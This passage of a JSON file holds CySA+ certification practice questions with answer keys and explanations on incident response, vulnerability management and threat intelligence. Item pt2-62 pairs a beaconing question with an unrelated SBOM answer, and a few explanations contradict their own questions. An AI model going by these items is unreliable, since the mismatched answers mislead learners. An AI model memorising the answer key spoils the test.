with a changing set of systems is a common characteristic of more advanced malware packages. It is most likely that this system was compromised with malware that deleted itself when its ability to check in with a command-and-control (C2) system was removed, thus preventing the malware from being captured and analyzed by incident responders.","l":"c11-contain","l2":"c3-network","k":"anti-forensic network disconnection self-deletion"},{"id":"pt2-52","set":"pt2","ch":6,"d":2,"q":"Which one of the following ISO standards provides guidance on the development and implementation of information security management systems?","o":["ISO 27001","ISO 9000","ISO 11120","ISO 23270"],"a":0,"e":"International Organization for Standardization (ISO) 27001 provides guidance on information security management systems. ISO 9000 applies to quality management. ISO 11120 applies to gas cylinders. ISO 23270 applies to programming languages.","l":"c6-requirements","l2":"","k":"ISO 27001 ISMS standard"},{"id":"pt2-53","set":"pt2","ch":8,"d":2,"q":"Mika’s wants to address a risk created by a vulnerable application that she is unable to patch because the vendor has not released an update. To address this issue, she installs an IPS with appropriately configured rules to block the exploit. What risk management strategy has she implemented?","o":["Acceptance","Transfer","Avoidance","Mitigation"],"a":3,"e":"Mika has adopted a mitigation strategy by putting in a compensating control. Acceptance would have required leadership sign off to leave the risk in place, transfer might have involved insurance, and avoidance would have required eliminating the activity, in this case likely by disabling the vulnerable application.","l":"c8-managing","l2":"","k":"risk mitigation compensating control"},{"id":"pt2-54","set":"pt2","ch":2,"d":1,"q":"Tracy is validating the web application security controls used by her organization. She wants to ensure that the organization is prepared to conduct forensic investigations of future security incidents. Which one of the following OWASP control categories is most likely to contribute to this effort?","o":["Implement logging","Validate all inputs","Parameterize queries","Error and exception handling"],"a":0,"e":"Logging of application and server activity may provide valuable evidence during a forensic investigation. The other three controls listed are proactive controls designed to reduce the risk of an incident occurring and are less likely to directly provide information during a forensic investigation.","l":"c2-logging","l2":"c3-cloud-social","k":"application event reconstruction logging"},{"id":"pt2-55","set":"pt2","ch":8,"d":2,"q":"Jamal is using agent-based scanning to assess the security of his environment. Every time that Jamal runs a vulnerability scan against a particular system, it causes the system to hang. He spoke with the system administrator, who provided him with a report showing that the system is current with patches and has a properly configured firewall that allows access from only a small set of trusted internal servers. Jamal and the server administrator both consulted the vendor, and they are unable to determine the cause of the crashes and suspect that it may be a side effect of the agent. What would be Jamal’s most appropriate course of action?","o":["Approve an exception for this server.","Continue scanning the server each day.","Require that the issue be corrected in 14 days and then resume scanning.","Decommission the server."],"a":0,"e":"This is an appropriate case for an exception to the scanning policy. The server appears to be secure, and the scanning itself is causing a production issue. Jamal should continue to monitor the situation and consider alternative forms of scanning, but it would not be appropriate to continue the scanning or set an artificial deadline that is highly unlikely to be met. Decommissioning the server is an excessive action as there is no indication that it is insecure, and the issue may, in fact, be a problem with the scanner itself.","l":"c8-governance","l2":"c7-validate","k":"vulnerability scanning policy exception"},{"id":"pt2-56","set":"pt2","ch":5,"d":2,"q":"During an <code>nmap</code> port scan using the <code>-sV</code> flag to determine service versions, Ling discovers that the version of SSH on the Linux system she is scanning is not up-to-date. When she asks the system administrators, they inform her that the system is fully patched and that the SSH version is current. What issue is Ling most likely experiencing?","o":["The system administrators are incorrect.","The <code>nmap</code> version identification is using the banner to determine the service version.","<code>nmap</code> does not provide service version information, so Ling cannot determine version levels in this way.","The systems have not been rebooted since they were patched."],"a":1,"e":"Although <code>nmap</code> provides service version identification, it relies heavily on the information that the services provide. In some cases, fully patched services may provide banner information that does not show the minor version or may not change banners after a patch, leading to incorrect version identification.","l":"c5-portscan","l2":"","k":"Nmap service banner version identification"},{"id":"pt2-57","set":"pt2","ch":6,"d":2,"q":"Tyler scans his organization’s mail server for vulnerabilities and finds the result shown here. What should be his next step?\n<figure>\n<img alt=\"Screenshot details Microsoft Exchange C A S information with description, solution, output, and plugin details.\" loading=\"lazy\" src=\"img/pt/c06un012.png\"/>\n</figure>","o":["Shut down the server immediately.","Initiate the change management process to install a patch.","Apply the patch and document the change.","Rerun the scan."],"a":1,"e":"Tyler should initiate his organization’s change management process to begin the patching process. This is a medium severity vulnerability, so there is no need to apply the patch in an emergency fashion that would bypass change management. Similarly, shutting down the server would cause a serious disruption, and the level of severity does not justify that. Finally, there is no need to rerun the scan because there is no indication that it is a false positive result.","l":"c6-remediation","l2":"c8-controls","k":"vulnerability patching change management"},{"id":"pt2-58","set":"pt2","ch":6,"d":2,"q":"Ava is performing a penetration test of a web application and would like to use a software package that allows her to modify requests being sent from her system to a remote web server. Which one of the following tools would <i>not</i> meet Ava’s needs?","o":["Nessus","Burp Suite","Zed Attack Proxy (ZAP)","Tamper Data"],"a":0,"e":"Carla is looking for a tool from a category known as interception proxies. They run on the tester’s system and intercept requests being sent from the web browser to the web server before they are released onto the network. This allows the tester to manually manipulate the request to attempt the injection of an attack. Burp Suite, ZAP, and Tamper Data are all examples of interception proxies. Nessus is a vulnerability scanner and, though useful in penetration testing, does not serve as an interception proxy.","l":"c6-tools","l2":"","k":"interception proxies web application testing"},{"id":"pt2-59","set":"pt2","ch":9,"d":3,"q":"Alex learns that a recent Microsoft patch covers a zero-day exploit in Microsoft Office that occurs because of incorrect memory handling. The flaw is described as potentially resulting in memory corruption and arbitrary code execution in the context of the current privilege level. Exploitation of the flaws can occur if victims open a specifically crafted Office document in a vulnerable version of Microsoft Office.\n<p>If Alex finds out that approximately 15 of the workstations in his organization have been compromised by this malware, including one workstation belonging to a domain administrator, what phase of the incident response process should he enter next?</p>","o":["Preparation","Detection and analysis","Containment, eradication, and recovery","Post-incident activity"],"a":2,"e":"Alex needs to quickly move into containment mode by limiting the impact of the compromise. He can then gather the evidence and data needed to support the incident response effort, allowing him to work with his organization’s desktop and IT support teams to return the organization to normal function.","l":"c9-process","l2":"c11-contain","k":"incident response containment phase"},{"id":"pt2-60","set":"pt2","ch":2,"d":1,"q":"Maria wants to use a security benchmark that is widely used throughout the industry to baseline her systems as part of a hardening process. Which of the following organizations provides a set of freely available benchmarks for operating systems?","o":["The Center for Internet Security","CompTIA","PCI SSC","OWASP"],"a":0,"e":"The Center for Internet Security (CIS) provides a range of free security baselines for Windows, Linux, macOS, and applications and services of many types. CompTIA, the Payment Card Industry Security Standards Council (PCI SSC), and the Open Worldwide Application Security Project (OWASP) do not.","l":"c2-os","l2":"c6-requirements","k":"CIS security configuration benchmarks"},{"id":"pt2-61","set":"pt2","ch":7,"d":2,"q":"Sally’s organization wants to prioritize their vulnerability remediation efforts. Which of the following items is not typically critical to prioritization of remediation efforts?","o":["A list of affected hosts","The risk score of the vulnerability","The vulnerability’s name or CVE","The organization or individual that discovered the vulnerability"],"a":3,"e":"Figuring out which vulnerabilities should receive attention first means that organizations need to understand the scope and impact of the vulnerability, both of which can be more easily determined with a risk score and a list of affected hosts. Knowing the vulnerability’s name, or even better its CVE identifier, allows it to be researched. Who discovered it is not relevant to remediation prioritization.","l":"c7-validate","l2":"c6-remediation","k":"vulnerability prioritization criteria factors"},{"id":"pt2-62","set":"pt2","ch":8,"d":2,"q":"Chris is reviewing network flow data from systems in his organization and notices that a number of the systems are contacting a remote IP address periodically through the day. He suspects the systems may be compromised. What type of behavior is he most likely seeing?","o":["DAST","SBOM","SAST","SAMM"],"a":1,"e":"If Chris has a software bill of materials (SBOM) for each of his organization’s applications, he could quickly check for the vulnerable component. Dynamic or static testing helps to find vulnerabilities in code, but it doesn’t identify libraries and components. Software maturity models are helpful for determining if an organization has good practices but don’t directly help in this scenario either.","l":"c8-appsec","l2":"","k":"Software Bill of Materials dependency tracking"},{"id":"pt2-63","set":"pt2","ch":12,"d":4,"q":"What concern may drive organizations to communicate with customers impacted by a breach within a specific timeline?","o":["Regulatory compliance","Media awareness","Social media interaction","Police involvement"],"a":0,"e":"Regulations and laws may require customer notification in a timely manner or in a specific timeframe once an organization has information about the breach. This frequently drives disclosure. Contractual requirements, while not listed here, are the other primary driver of time-bound disclosures. Media, social media, and police involvement are not primary drivers to a specific timeline but may put pressure on an organization.","l":"c12-ir-report","l2":"","k":"breach notification regulatory compliance"},{"id":"pt2-64","set":"pt2","ch":3,"d":1,"q":"Yuri wants to check if an IP address is known to be malicious. Which of the following options is the most useful way for him to manually check current information about an IP address or hostname?","o":["The SANS Top 2","AbuseIPDB","WHOIS","Cuckoo Sandbox"],"a":1,"e":"The only service that provides reputational information from this list is the AbuseIPDB. The SANS Top 20 are a set of lists of critical controls, vulnerabilities, and other items. WHOIS is a lookup services allowing IP addresses and hostnames to be resolved, and Cuckoo Sandbox is an open source sandbox tool.","l":"c3-tip-edr","l2":"","k":"IP reputation lookup services"},{"id":"pt2-65","set":"pt2","ch":8,"d":2,"q":"Reese’s organization is a managed security provider that uses the ITIL, and Reese wants to determine if her team is meeting the service level agreements her organization has agreed to meet for their customers for vulnerability management notifications happening within 24 hours. What is Reese attempting to assess?","o":["A VMO","A SLO","An NDA","A VMS"],"a":1,"e":"Reese is managing to a service level objective (SLO). SLOs are agreements that are found in service level agreements (SLAs) that specify a metric such as time to respond or expected uptime. An NDA is a nondisclosure agreement, VMS is a vulnerability management system, and VMO was made up for this question.","l":"c8-governance","l2":"","k":"Service Level Objective definition"},{"id":"pt2-66","set":"pt2","ch":4,"d":1,"q":"Joanna’s organization has been performing a forensic investigation of a compromised system. Her team’s analysis indicates that the actions were taken by one of her team members, and that the data that was taken was published on an external website. Her team’s analysis indicates that a number of commonly available tools were used by the attacker and that the attacker was using basic, rather than advanced, skills and techniques. What type of threat actor is Joanna most likely dealing with?","o":["A hacktivist","A nation-state actor","A script kiddie","Organized crime"],"a":2,"e":"Script kiddies are unsophisticated attackers who use widely available tools without an in-depth understanding or skillset. All of the information that Joanna and her team have indicate they were attacked by a script kiddie. A nation-state actor or organized crime group is more likely to use advanced techniques or customized tools, while a hacktivist will typically have a specific political purpose for an attack that was not described here.","l":"c4-classify","l2":"","k":"script kiddie threat actor"},{"id":"pt2-67","set":"pt2","ch":12,"d":4,"q":"Michelle wants to provide metrics for her security team’s incident response capabilities. Which of the following is not a common measure for teams like hers?","o":["Mean time to detect","Mean time to respond","Mean time to remediate","Mean time to compromise"],"a":3,"e":"Mean time to compromise is not a typical metric or key performance indicator for security teams. Mean time to detect, mean time to respond, and mean time to remediate are all common metrics for teams.","l":"c12-ir-report","l2":"","k":"incident response performance metrics"},{"id":"pt2-68","set":"pt2","ch":1,"d":1,"q":"Tony is working with information from a closed source threat feed and combines the feed information with his own organization’s vulnerability management data and asset databases. What activity is Tony performing?","o":["IoC analysis","Geolocation","Active defense","Data enrichment"],"a":3,"e":"Tony is performing data enrichment by combining threat feeds with additional data to improve his ability to use contextual data from his own organization. IoC analysis would involve using indicators of compromise to identify potential compromises. There is no mention of geographic data for geolocation, and active defenses involve working actively to stop attackers by responding rather than simply combining information with threat feed data.","l":"c1-efficiency","l2":"c4-collect","k":"threat intelligence data enrichment"},{"id":"pt2-69","set":"pt2","ch":12,"d":4,"q":"Which of the following is not a common inhibitor to remediation of vulnerabilities?","o":["Legacy systems","Organizational policies","The potential to degrade functionality","Organizational governance processes"],"a":1,"e":"Organizational policies are often used to drive remediation processes by defining set timelines for patching for based on risk and other factors. Common inhibitors to remediation include MOUs and SLAs, which may require specific performance or uptime; organizational governance processes that slow down actions; and concerns about business process interruptions or degrading functionality, legacy, and proprietary systems.","l":"c12-vuln-report","l2":"","k":"vulnerability remediation inhibitors"},{"id":"pt2-70","set":"pt2","ch":4,"d":1,"q":"Greg wants to assess the confidence levels for his threat intelligence data. What three common items are most frequently used to determine confidence in threat intelligence?","o":["Timeliness, source quality, and cost","Accuracy, threat actor, and likelihood","Timeliness, relevance, and accuracy","Accuracy, source quality, and cost"],"a":2,"e":"Greg knows that timeliness, relevance, and accuracy are the key factors typically used to assess threat intelligence confidence levels.","l":"c4-collect","l2":"","k":"threat intelligence confidence factors"},{"id":"pt2-71","set":"pt2","ch":9,"d":3,"q":"Valerie has discovered malicious software is running on a server in her environment due to outbound connections to a system outside of her organization. The malware appears to be checking in regularly, but no further actions have been detected. What stage of the Cyber Kill Chain should Valerie label this attack as?","o":["Weaponization","Delivery","Command and Control","Actions on Objectives"],"a":2,"e":"This attack is in the Command and Control stage, and is waiting for commands to take actions on objectives. Weaponization combines a payload with an exploit, and Delivery occurs when the malware or tool is sent, often via a phishing attack or other delivery method.","l":"c9-frameworks","l2":"","k":"Cyber Kill Chain Command and Control"},{"id":"pt2-72","set":"pt2","ch":3,"d":1,"q":"Isaac wants to view network traffic from a potentially compromised Linux machine. What tool can he use from the command line to view and analyze his network traffic?","o":["Wireshark","<code>tcpdump</code>","Ettercap","<code>cat/dev/eth0</code>"],"a":1,"e":"The <code>tcpdump</code> tool is included in many Linux distributions by default and is a command-line tool that can capture network traffic. Isaac can use <code>tcpdump</code> to perform his analysis but may want to use Wireshark’s graphical user interface if he wants to perform more detailed analysis. Ettercap is an on-path attack tool, and simply using the <code>cat</code> (concatenate) command on the Ethernet device won’t work to display traffic.","l":"c3-tools","l2":"","k":"Linux tcpdump packet capture"},{"id":"pt2-73","set":"pt2","ch":7,"d":2,"q":"Beena wants to ensure that her vulnerability management program is performing as expected. What technique should she use to look at its performance over time so she can see if she has problematic behaviors or practices?","o":["A regularly created list of the top 10 most common vulnerabilities","A report showing remediation and patching trends","A list of zero-day vulnerabilities and the time to remediate them","A list of service level objectives"],"a":1,"e":"Trends help to determine if there is a new or increasing problem with patching. Beena can review the trends to see if her organization’s performance is stable or improving, or if issues are occurring. A list of the top 10 vulnerabilities does not provide this. A list of zero-day vulnerabilities and the time to remediate them does not help her assess performance, nor does a list of service level objectives without data about whether they were met and how often.","l":"c7-validate","l2":"c12-vuln-report","k":"vulnerability remediation trend analysis"},{"id":"pt2-74","set":"pt2","ch":3,"d":1,"q":"Valentine is reviewing network flow logs and sees a 30 GB data transfer between a database server and a system outside of her organization. For reviews, how should she flag the event?","o":["Potential data exfiltration","Potential use of unauthorized privileges","A potential malicious process","Potential high drive capacity consumption"],"a":0,"e":"Valentine knows that large data transfer from servers like a database server that should not typically send data to outside systems is likely to be data exfiltration. She should immediately flag the transfer for further investigation. There is no indication of the use of unauthorized privileges, but a malicious process may be found when she digs in further. There is also no indicator of drive capacity consumption.","l":"c3-network","l2":"","k":"network data exfiltration indicator"},{"id":"pt2-75","set":"pt2","ch":12,"d":4,"q":"Selah wants to use appropriate metrics to determine how well her incident response process is working. Which of the following metrics is not commonly used to assess incident response processes?","o":["Mean time to remediate","Meant time to detect","Mean time to respond","Mean time to defend"],"a":3,"e":"Mean time to detect, respond, and remediate are all commonly used measures. Use of active defenses is less common, and thus mean time to defend is not a commonly used measure; instead, time to respond in general is measured.","l":"c12-ir-report","l2":"","k":"incident response metrics MTTD MTTR"},{"id":"pt2-76","set":"pt2","ch":2,"d":1,"q":"Gary wants to use NTP to help with his log analysis efforts. What is Gary doing?","o":["Setting appropriate logging levels","Removing unnecessary logs using a trust process","Time synchronization","Validating log entries against the originals"],"a":2,"e":"The Network Time Protocol (NTP) is used for time synchronization. This ensures logs have correct timestamps allowing correlation between logs from systems throughout an organization. This does not set logging levels, remove unnecessary logs, or validate log entries.","l":"c2-logging","l2":"","k":"NTP log time synchronization"},{"id":"pt2-77","set":"pt2","ch":8,"d":2,"q":"Nathan’s organization has been notified that there is a vulnerability in a legacy system that does not have vendor support. Nathan needs to ensure that the system is not compromised due to the vulnerability. What should Nathan implement to address this issue?","o":["A patching plan","A compensating control","A remediation plan","An alternate patch"],"a":1,"e":"Nathan should document and deploy a compensating control. This may also require the vulnerability to be marked in the vulnerability management system to ensure that future detections are not flagged for noncompliance. A patching or remediation plan won’t resolve the issue or protect the system, and alternative patches are not commonly available.","l":"c8-governance","l2":"c8-controls","k":"compensating control for unsupported legacy systems"},{"id":"pt2-78","set":"pt2","ch":11,"d":3,"q":"Marko is in the eradication phase of the incident response process. Which of the following steps is the most likely to result in a successful eradication step?","o":["Reimaging from a known good image with updates installed","Deleting malicious code","Patching the system","Manually reinstalling the operating system"],"a":0,"e":"Reimaging from a known good image with patches installed is less likely to expose the system to attacks while it is being rebuilt. Deleting malicious code and patching the system do not accomplish the eradication process by themselves.","l":"c11-recover","l2":"c9-process","k":"incident eradication reimaging"},{"id":"pt2-79","set":"pt2","ch":12,"d":4,"q":"What phase of incident response needs to happen before customer communications can occur?","o":["Perform stakeholder identification.","Document lessons learned.","Prepare a timeline.","Conduct a root-cause analysis."],"a":0,"e":"Before communications occur with external parties such as customers, the stakeholders must be identified to ensure that communications go to the appropriate people or organizations. Since communications often happen during the investigation, having lessons learned, a timeline, or a root-cause analysis ready may not occur until after at least some customer communication has needed to happen.","l":"c12-ir-report","l2":"c9-foundation","k":"incident stakeholder identification and communication"},{"id":"pt2-80","set":"pt2","ch":3,"d":1,"q":"Jake wants to ensure that only authorized IP addresses can send email on behalf of his organization but doesn’t want to require certificates and signatures for the validation. What should he implement?","o":["DKIM","DMARC","S/MIME","SPF"],"a":3,"e":"The Sender Policy Framework (SPF) allows you to create a list of authorized IP addresses that can send emails on an organization’s behalf. This is done by publishing and checking a SPF record maintained by the organization. Domain Keys Identified Mail (DKIM) uses public key cryptography and uses a private key to sign email headers. Domain-Based Message Authentication, Reporting, and Compliance (DMARC) combines SPF and DKIM to validate senders and take actions based on a policy. Secure/Multipurpose Internet Mail Extensions (S/MIME) is a protocol for sending messages using digital signatures and encryption.","l":"c3-filesandbox","l2":"","k":"Sender Policy Framework IP authorization"},{"id":"pt2-81","set":"pt2","ch":2,"d":1,"q":"Katie has been reviewing her organization’s vulnerability management reports and notices that systems that are part of a cloud-hosted cluster continue to show a recurring issue where vulnerabilities reappear when the cluster is scaled up to handle higher loads. What is the most likely issue that Katie should ask the system administrators about?","o":["Reinstallation of the same software package instead of a patched version","A lack of update to the original cluster image","Patches failing to install","A compromise restoring the system to a vulnerable state"],"a":1,"e":"Since autoscaling clusters often rely on an image for systems as they are instantiated, a base image that does not include the patch can result in exactly this scenario. This is why organizations often use infrastructure-as-code (IaC) capabilities to allow patching and updates before a system is placed into production. Reinstalling the same software package is often a human error or a problem with scripting and less likely to be repeated. Patches failing to install would also likely be identified after the issue was reported. A compromise is more likely to be allowed by a vulnerability than for a compromise to cause the system to display a new vulnerability.","l":"c2-infra","l2":"c12-vuln-report","k":"cloud autoscaling golden image patching"},{"id":"pt2-82","set":"pt2","ch":12,"d":4,"q":"Bethany is developing a risk scorecard that will be presented to her organization’s leadership team. The leadership team has expressed concerns about slow patching processes, and Bethany wants to specifically address that issue on the scorecard. Which of the following measures should she include?","o":["Mean time to respond","Mean time to detect","Mean time to close","Mean time to remediate"],"a":3,"e":"Mean time to remediate (MTTR) is a frequently used metric that measures how long it takes to remediate an issue like a vulnerability. Mean time to respond, detect, and close are all associated with incident response.","l":"c12-vuln-report","l2":"","k":"mean time to remediate metric"},{"id":"pt2-83","set":"pt2","ch":2,"d":1,"q":"Bob’s organization wants to adopt passwordless authentication. What will they need to provide to users to adopt this solution?","o":["PINs","Biometric identifiers","Hardware tokens","New passwords"],"a":2,"e":"Passwordless authentication requires either hardware tokens or authentication applications, typically deployed to mobile devices like phones. PINs are still a knowledge factor, new passwords would not be passwordless, and biometric identifiers are not provided to users; they are set up for users based on their biometric data.","l":"c2-iam","l2":"","k":"passwordless authentication hardware tokens"},{"id":"pt2-84","set":"pt2","ch":1,"d":1,"q":"Hillary is working on improving her organization’s security response processes and wants to integrate security tools from multiple vendors together. What type of integration should she look for to optimize the ability for systems to work together and exchange data?","o":["FTP-based integration","Data scraping from built-in web pages","API-based integration","A single pane of glass design"],"a":2,"e":"When working with tools from multiple vendors, Hillary knows that having well-documented and available APIs can be one of the most effective ways to exchange data and information. FTP and data scraping are both slower and less reliable options. While a single pane of glass design is desirable, it doesn’t enable data exchange.","l":"c1-efficiency","l2":"c2-infra","k":"security tool API integration"},{"id":"pt2-85","set":"pt2","ch":2,"d":1,"q":"Jill is implementing a SASE solution for her organization to support remote workers. She has configured a policy that requires device posture and configuration validation as well as multifactor authentication prior to connecting to a sensitive on-premise file server. What SASE component is she leveraging?","o":["ZTNA","FWaaS","EDR","CASB"],"a":0,"e":"Zero trust provides security posture and identity aware controls for applications and servers. FWaaS, or firewall as a service provides a cloud-based firewall capability, EDR handles anti-malware detection and response capabilities, and cloud access security brokers sit between users and cloud applications where they enforce policies and protect data. Since the server is not in the cloud and is instead on-premise, a CASB is not an appropriate solution.","l":"c2-netarch","l2":"","k":"ZTNA SASE remote access"},{"id":"lq:start-exam:1","set":"lq","ch":1,"d":1,"q":"A candidate begins the CySA+ CS0-004 exam and is presented with three complex Performance-Based Questions (PBQs) at the start of the session. What is the BEST time-management strategy for the candidate to adopt?","o":["Skip and flag the PBQs on the first pass, complete all multiple-choice questions first, and return to the PBQs with remaining time.","Spend an initial 45 minutes solving all PBQs first to ensure maximum points on high-value questions before starting multiple-choice.","Complete only the multiple-choice questions and leave PBQs unattempted because PBQs do not award partial credit.","Work through all PBQs completely before starting the multiple-choice section, regardless of how much time elapses."],"a":0,"e":"CompTIA places PBQs at the very start of the exam. Skipping and flagging them allows the candidate to bank quick points on multiple-choice items, establish pacing, and trigger recall before tackling the heavily weighted, time-consuming simulations. Option B is tempting because PBQs carry substantial weight, but spending 45 minutes upfront risks running out of time on dozens of straightforward multiple-choice questions. Option C forfeits critical points, and Option D leads to severe time exhaustion.","l":"start-exam","l2":"","k":""},{"id":"lq:start-exam:2","set":"lq","ch":1,"d":1,"q":"An analyst is sitting for the CS0-004 examination and has two minutes remaining with five unanswered questions. Which exam principle should dictate the analyst's immediate action?","o":["Leave the five questions blank to avoid negative scoring deductions applied to incorrect answers.","Select an answer for all five questions immediately because CompTIA does not penalize incorrect guesses.","Spend the remaining two minutes thoroughly analyzing one question and leave the other four unanswered.","Flag the five questions for review without selecting responses so the scoring engine calculates an unpenalized baseline."],"a":1,"e":"CompTIA exams do not penalize incorrect guesses. Leaving a question blank guarantees zero points, whereas selecting an answer for every remaining item gives a 25% mathematical probability of correctness on each question. Option C is the most tempting mistake: candidates often try to ensure one correct answer rather than guessing on all five, sacrificing four potential scoring opportunities. Option A is false because CompTIA does not use negative marking, and Option D leaves questions unscored.","l":"start-exam","l2":"","k":""},{"id":"lq:start-exam:3","set":"lq","ch":1,"d":1,"q":"Which domain represents the LARGEST percentage weighting on the CompTIA CySA+ CS0-004 certification exam?","o":["Vulnerability Management","Incident Response and Management","Security Operations","Reporting and Communication"],"a":2,"e":"Domain 1.0 (Security Operations) accounts for 34% of the CS0-004 exam, making it the single largest domain by weight. Vulnerability Management (Domain 2.0) represents 26%, Incident Response and Management (Domain 3.0) represents 24%, and Reporting and Communication (Domain 4.0) represents 16%. Candidates often assume Incident Response carries the heaviest weighting due to its broad operational scope, but Security Operations dominates the objective blueprint.","l":"start-exam","l2":"","k":""},{"id":"lq:start-exam:4","set":"lq","ch":1,"d":1,"q":"A newly hired SOC analyst is tasked with monitoring the SIEM console queue, conducting initial triage of incoming alerts to separate true positives from false positives, and escalating valid security events to senior engineers. Which role does this analyst occupy?","o":["Threat Intelligence Analyst","Tier 2 Analyst","Tier 3 Analyst","Tier 1 Analyst"],"a":3,"e":"Tier 1 analysts handle high-volume alert triage, classify incoming events as true or false positives, and escalate incidents based on SOP criteria. Tier 2 analysts perform deeper correlation and timeline analysis. Tier 3 analysts execute proactive threat hunts. Threat Intelligence analysts ingest and track external adversary indicators.","l":"start-exam","l2":"","k":""},{"id":"lq:start-exam:5","set":"lq","ch":1,"d":1,"q":"During alert triage, a Tier 1 analyst discovers evidence of unauthorized PowerShell execution on an internal server. According to standard SOC operating boundaries, what is the analyst's NEXT action?","o":["Escalate the ticket to Tier 2 with initial triage findings, host details, and command-line artifacts.","Reboot the infected server immediately into safe mode to prevent malware persistence.","Isolate the host at the network layer and begin reverse-engineering the decoded PowerShell payload.","Execute an enterprise-wide proactive threat hunt across all endpoints using custom Sigma rules."],"a":0,"e":"Tier 1 analysts focus on triage, validation, and escalation. Once an alert is validated as a true positive, the proper action is escalating to Tier 2 with documented artifacts (parent process, command-line arguments, host IP). Option C is tempting because containing and reverse-engineering the payload addresses the attack, but deep forensic analysis and payload decompilation belong to Tier 2 or specialized incident handlers. Option B destroys volatile RAM evidence, and Option D is the responsibility of Tier 3 threat hunters.","l":"start-exam","l2":"","k":""},{"id":"lq:start-exam:6","set":"lq","ch":1,"d":1,"q":"An analyst reviewing study materials notices that two multiple-choice options both describe valid security tools for network monitoring. What is the BEST guideline for selecting the correct answer on a CySA+ scenario question?","o":["Select the tool that provides the broadest automated response capabilities regardless of operational constraints.","Evaluate the specific scenario constraints, user role, and operational objectives to break the tie.","Choose the option representing an open-source tool because CompTIA standards strictly favor open-source over commercial suites.","Select the preventive technical control because preventive controls always supersede detective controls on CompTIA exams."],"a":1,"e":"CySA+ scenario questions regularly provide multiple technically valid tools or actions. The scenario context (such as preserving forensic integrity, operating within role boundaries, or respecting air-gapped environments) serves as the decisive tiebreaker. Option C is a common candidate misconception; CompTIA tests vendor-neutral concepts but does not automatically prefer open source. Option D is incorrect because detective controls are frequently the intended answer when the scenario calls for monitoring or investigation.","l":"start-exam","l2":"","k":""},{"id":"lq:start-exam:7","set":"lq","ch":1,"d":1,"q":"A government contractor requires all security analysts to maintain a certification approved under DoD Directive 8140. Which attribute makes CySA+ CS0-004 eligible for this requirement?","o":["It requires candidates to complete an accredited collegiate degree program recognized under the NSA CAE-CD initiative.","It requires mandatory completion of a federally audited background investigation and national security clearance.","It is accredited by ANAB to comply with the international personnel certification standard ISO/IEC 17024.","It is evaluated and certified directly by the National Security Agency Committee on National Security Systems (CNSS)."],"a":2,"e":"CySA+ fulfills DoD Directive 8140 (and legacy DoD 8570.01-M) requirements because it is accredited by the ANSI National Accreditation Board (ANAB) under the ISO/IEC 17024 standard for personnel certification bodies. Option D is tempting because the NSA CNSS certifies certain federal security curricula, but commercial vendor-neutral certifications achieve DoD approval through ISO/IEC 17024 accreditation. Options A and B describe academic and security clearance criteria rather than commercial certification accreditation.","l":"start-exam","l2":"","k":""},{"id":"lq:start-exam:8","set":"lq","ch":1,"d":1,"q":"An analyst is investigating an alert and wants to ensure proper incident handling sequence. According to standard incident response frameworks, which phase MUST be completed before beginning Eradication?","o":["Recovery","Lessons Learned","Post-Incident Activity","Containment"],"a":3,"e":"In the standard incident response lifecycle (Preparation, Detection & Analysis, Containment, Eradication, Recovery, Post-Incident Activity), Containment must precede Eradication. Eradicating malware before containing the host risks alerting the attacker and causing lateral movement. Recovery and Post-Incident Activity follow Eradication.","l":"start-exam","l2":"","k":""},{"id":"lq:start-exam:9","set":"lq","ch":1,"d":1,"q":"A SOC manager is planning to implement a SOAR solution to address analyst burnout. Which capability BEST illustrates the primary role of SOAR within security operations?","o":["Automating repetitive triage workflows and executing pre-approved containment runbooks.","Replacing Tier 1 and Tier 2 analysts entirely to allow fully autonomous SOC operations.","Aggregating and normalizing external threat intelligence feeds to attribute adversary campaigns.","Ingesting, parsing, and indexing raw syslog feeds for multi-year regulatory compliance archiving."],"a":0,"e":"SOAR platforms excel at automating repetitive, predictable tasks (such as reputation lookups or disabling compromised user accounts via runbooks), freeing analysts for complex investigation. Option B is a dangerous operational myth; SOAR enhances human analysts rather than replacing them. Option C describes a Threat Intelligence Platform (TIP), and Option D describes a centralized SIEM or log management repository.","l":"start-exam","l2":"","k":""},{"id":"lq:c1-objectives:1","set":"lq","ch":1,"d":1,"q":"A security analyst notices that the SHA-256 hash of a critical operating system configuration file does not match the baseline hash recorded after last week's patch deployment. Which principle of the CIA Triad has been compromised?","o":["Integrity","Confidentiality","Availability","Non-repudiation"],"a":0,"e":"Integrity ensures that systems and data are protected from unauthorized or accidental modification. A cryptographic hash mismatch indicates that the file content has been altered. Confidentiality (Option B) protects against unauthorized disclosure. Availability (Option C) ensures systems are accessible. Non-repudiation (Option D) proves who performed an action.","l":"c1-objectives","l2":"","k":""},{"id":"lq:c1-objectives:2","set":"lq","ch":1,"d":1,"q":"Which statement BEST differentiates cybersecurity from privacy within an enterprise risk management program?","o":["Cybersecurity enforces technical and operational safeguards to protect systems and data from unauthorized access or disruption, while privacy governs the lawful, ethical, and consented processing and retention of personal data.","Cybersecurity focuses exclusively on meeting external regulatory breach reporting mandates, while privacy manages the technical encryption algorithms applied to internal storage repositories.","Cybersecurity dictates how individual consumer consent is recorded and honored, while privacy enforces network segmentation and host-based access controls across infrastructure.","Cybersecurity is restricted to physical facility and perimeter hardware protections, while privacy encompasses all logical and software-based data security configurations."],"a":0,"e":"Cybersecurity focuses on protecting systems, networks, and data from unauthorized disclosure, modification, or downtime (the CIA Triad). Privacy focuses on the rights of individuals and the lawful, ethical collection, processing, sharing, retention, and disposal of personal information. The other options confuse technical safeguards with data subject rights or invert the scopes of the two disciplines.","l":"c1-objectives","l2":"","k":""},{"id":"lq:c1-objectives:3","set":"lq","ch":1,"d":1,"q":"An employee contacts the customer service department requesting to view the personal data the company has stored in their profile and correct an outdated home address. Which Privacy Management Framework (PMF) objective directly mandates this capability?","o":["Management","Collection and creation","Access","Security for privacy"],"a":2,"e":"The PMF Access objective requires organizations to provide individuals with the ability to review, verify, and correct personal information stored about them. Management (Option A) requires documenting policies. Collection and creation (Option B) governs acquiring PII with consent. Security for privacy (Option D) focuses on technical protections against unauthorized access.","l":"c1-objectives","l2":"","k":""},{"id":"lq:c1-objectives:4","set":"lq","ch":1,"d":1,"q":"The head of finance defines that financial quarterly projections must be classified as 'Confidential' and restricted to authorized managers. The systems administrator then applies the corresponding Windows file share permissions and BitLocker encryption to the folder. In this scenario, which roles were performed by the finance head and administrator, respectively?","o":["Data Custodian and Data Processor","Data Subject and Data Steward","Data Protection Officer and Data Controller","Data Owner and Data Custodian"],"a":3,"e":"The Data Owner is a business leader who determines the classification level of data and decides who is authorized to access it. The Data Custodian is the IT or security professional who implements the technical controls (such as permissions, encryption, and backups) specified by the Data 